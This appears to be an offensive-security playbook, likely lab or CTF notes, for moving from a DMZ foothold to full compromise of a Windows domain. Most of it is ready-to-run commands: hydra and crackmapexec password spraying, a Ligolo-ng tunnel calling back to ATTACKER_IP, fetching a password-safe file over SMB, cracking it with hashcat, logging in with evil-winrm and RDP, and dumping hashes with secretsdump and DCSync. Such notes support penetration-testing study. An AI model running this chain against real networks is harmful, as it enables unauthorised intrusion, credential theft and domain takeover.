# DMZ Foothold → Pivot → Credential Chain → DC Compromise

**TL;DR**  
From an initial DMZ credential or sparse credential clue, gain a foothold, establish a stable pivot (Ligolo‑ng), enumerate SMB/RDP/WinRM surfaces, extract credential material (password safes, cached creds), crack offline where applicable, then escalate laterally to a jump host and onward to the Domain Controller via Pass‑The‑Hash or DCSync techniques.

---

## Goal

- Obtain initial access in DMZ from credential spray or discovered credential artifacts.  
- Establish a pivot into internal subnet for enumeration and lateral movement.  
- Harvest credential artifacts (password safe files, cached creds) and obtain NTLM/Administrator hashes for domain compromise.

## Prerequisites

- Environment: attacker host with `ligolo-ng`, `smbclient`, `smbmap`, `nmap`, `hydra`/`crackmapexec`, `hashcat`, and `snaffler` (or similar).  
- Basic familiarity with SMB enumeration and RDP/WinRM tooling.

---

## High-Level Flow

1. Generate username candidates and password-spray SSH/other DMZ services to find weak creds.  
2. Use valid credential(s) to access DMZ host (DMZ01). Drop pivot tooling (Ligolo‑ng or similar).  
3. Pivot into internal range (e.g., `172.16.119.0/24`).  
4. Enumerate SMB shares, harvest artifacts (e.g., `.psafe3` Password Safe files).  
5. Crack offline artifacts with `hashcat` to obtain plaintext credentials.  
6. Use newly discovered creds to access jump hosts (JUMP01).  
7. Use Mimikatz or other techniques to obtain NTLM/hash and move to DC.  
8. Use `secretsdump`, `DCSync`, or PTH to obtain the Administrator hash and confirm domain compromise.

---

## Commands & Techniques

### 1) Username generation & password spray (SSH/RDP/SMB)

```bash
# hydra example (ssh)
hydra -L users.txt -P rockyou.txt ssh://10.10.10.10 -t 8

# crackmapexec spray (smb/rpc)
crackmapexec smb 172.16.119.0/24 -u users.txt -p 'Password1' --continue-on-success
```

### 2) Drop and run Ligolo‑ng pivot

```bash
# on attacker
ligolo-ng -listen 0.0.0.0:9001 -proto tcp -server
# on DMZ host (staged)
./ligolo-ng -client -remote ATTACKER_IP:9001 -proto tcp
```

### 3) SMB enumeration & pull artifacts

```bash
smbclient -U 'NEXURA\hwilliam' \
  '\\172.16.119.10\HR' -c 'cd Archive; get Employee-Passwords_OLD.psafe3'

# use smbmap to list shares
smbmap -H 172.16.119.10 -u hwilliam -p 'password'
```

### 4) Crack Password Safe v3 (.psafe3)

```bash
# hashcat mode 5200 (Password Safe v3)
hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz --force
```

### 5) Lateral movement: RDP / WinRM / SMB

```bash
# xfreerdp (RDP)
xfreerdp /v:JUMP01 /u:administrator /p:'P@ssw0rd'

# evil-winrm example for WinRM
evil-winrm -i JUMP01 -u Administrator -p 'P@ssw0rd'
```

### 6) Dumping credentials / hashes

```bash
# Mimikatz (lsass) on a jump host
# Or use impacket-secretsdump for remote dumping with creds
impacket-secretsdump -outputfile creds -just-dc-user Administrator 'DOMAIN/JUMP01$'@dc01.domain.local

# DCSync via impacket if you have replication rights
secretsdump.py -just-dc -outputfile dump DOMAIN/Administrator@dc01.domain.local
```

---

## Things to Watch For (red flags)

- Password safes in shared folders (`.psafe3`, KeePass, etc.).  
- Reused credentials across DMZ → internal jump hosts.  
- Unexpected SMB shares with backup/archive files.  
- Presence of defensive tooling that may detect pivoting (EDR/IPS in lab may be disabled).

## Cleanup & Safety

- Remove ligolo client binaries and any uploaded tools.  
- Clear temporary files, check for persistent services created by you.  
- In lab: snapshot/rollback. In real engagements: document actions and leave forensic artifacts intact unless otherwise agreed per ROE.

---

## Further reading / tools

- `ligolo-ng` (pivoting) — multi‑hop tunneling.  
- `snaffler` — artifact hunting.  
- `hashcat` — offline cracking.  
- `impacket` tools — `secretsdump`, DCSync helpers.
